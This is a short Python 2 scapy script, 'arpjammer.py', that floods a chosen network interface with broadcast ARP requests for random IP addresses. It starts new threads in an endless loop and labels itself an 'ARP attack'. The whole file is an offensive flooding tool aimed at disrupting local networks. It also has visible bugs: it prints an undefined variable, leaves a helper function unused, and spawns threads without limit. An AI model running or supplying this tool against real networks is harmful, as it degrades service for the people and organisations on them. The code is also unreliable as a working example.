#!/usr/bin/python
from scapy.all import *
import random
import sys
import threading


conf.verb=0

def get_random_ip():
    a = random.randint(1, 254)
    b = random.randint(1, 254)
    c = random.randint(1, 254)
    d = random.randint(1, 254)
    random_ip = str(a) + "." + str(b) + "."+ str(c) + "."+ str(d)
    return random_ip

def arp_jammer():
    while True:
        try:
            a = random.randint(1, 254)
            b = random.randint(1, 254)
            c = random.randint(1, 254)
            d = random.randint(1, 254)
            random_ip = str(a) + "." + str(b) + "." + str(c) + "." + str(d)
            srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=random_ip), timeout=2, verbose=0)
            print "send " + ip + " sucess!"
        except KeyboardInterrupt:
            print "[*] ARP attack finished."
            sys.exit(0)



def main():
    if len(sys.argv[1:])!=1:
        print"Usage ./arpjammer.py [interface]"
        print"Example: ./arpjammer.py eth0"
        sys.exit(0)
    interface=sys.argv[1]

    conf.iface=interface

    print "[*] Setting up %s"%interface


    try:
        while True:
            jammer_thread = threading.Thread(target=arp_jammer)
            jammer_thread.start()

    except KeyboardInterrupt:
        print "[*] ARP attack thread finished."
        sys.exit(0)

if __name__ == "__main__":
    #import cProfile
    #cProfile.run("main()", filename="analysis.out", sort="cumulative")
    main()